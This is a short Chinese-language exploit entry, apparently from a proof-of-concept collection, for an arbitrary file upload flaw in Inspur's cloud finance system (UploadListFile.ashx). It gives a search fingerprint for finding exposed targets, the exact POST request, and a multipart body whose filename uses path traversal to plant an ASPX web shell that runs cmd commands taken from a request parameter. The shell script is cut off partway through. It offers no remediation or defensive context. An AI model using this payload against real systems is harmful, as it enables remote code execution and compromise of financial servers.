# 浪潮云财务系统UploadListFile.ashx存在任意文件上传漏洞

- **系统**：浪潮云财务系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/cwbase/web/scripts/jquery.js"`
- **请求**：`POST /cwbase/EP/ListContent/UploadListFile.ashx?uptype=attslib&keyid=1&key1=1&key2=1 HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=---------------------------rww…`

**请求体 / payload**
```
-----------------------------rww5upkbw6ctf0tu5hye
Content-Disposition: form-data; name="file"; filename="../../../../../../rce.aspx"
Content-Type: image/png
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEn…（脚本共 737 字，完整版见原文）
```
- **预期**：200　|　—